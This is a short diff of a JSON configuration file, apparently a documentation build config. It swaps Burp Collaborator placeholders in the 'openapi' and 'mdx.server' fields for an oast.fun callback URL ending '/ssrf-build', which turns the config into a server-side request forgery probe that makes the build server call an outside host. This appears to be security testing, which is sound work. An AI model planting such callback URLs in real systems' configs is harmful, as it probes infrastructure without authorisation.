@@ -16,9 +16,9 @@
     }
   ],
   "api": {
-    "openapi": "REPLACE_WITH_BURP_COLLABORATOR_URL",
+    "openapi": "http://d8425ag24g0utp08aebgr3qup7d1e8xsg.oast.fun/ssrf-build",
     "mdx": {
-      "server": "REPLACE_WITH_BURP_COLLABORATOR_URL"
+      "server": "http://d8425ag24g0utp08aebgr3qup7d1e8xsg.oast.fun/ssrf-build"
     },
     "playground": {
       "proxy": true
